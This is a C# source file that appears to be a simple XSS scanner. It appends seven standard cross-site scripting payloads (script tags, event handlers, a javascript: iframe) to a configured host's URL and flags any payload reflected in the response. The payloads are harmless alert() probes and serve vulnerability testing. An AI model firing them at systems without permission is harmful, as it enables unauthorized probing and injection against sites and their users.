using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace Sevz.Services
{
    public class XssScannerTest
    {
        private static readonly HttpClient client = new HttpClient();

        public async Task TestXSS()
        {
            string savedIp = SetIP.GetSavedIp();
            string savedPort = SetPort.GetSavedPort();
            string url = $"http://{savedIp}:{savedPort}/#/";
            
            List<string> xssPayloads = new List<string>
            {
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "\" onmouseover=\"alert('XSS')\"",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload=alert('XSS')>",
            };

            foreach(var payload in xssPayloads)
            {
                string testUrl = url + Uri.EscapeDataString(payload);
                Console.WriteLine($"[+] Testing payload: {payload}");

                // GET 요청 생성(쿼리 파라미터 포함)
                var request = new HttpRequestMessage(HttpMethod.Get, testUrl);
                var response = await client.SendAsync(request);
                string responseBody = await response.Content.ReadAsStringAsync();

                // 응답에 페이로드가 있는지 확인
                if (responseBody.Contains(payload))
                {
                    Console.WriteLine($"[!] XSS vulnerability detected! Payload: {payload}");
                }
                else
                {
                    Console.WriteLine($"[+] No XSS vulnerability found with payload: {payload}");
                }
            }
            
        }
    }
}
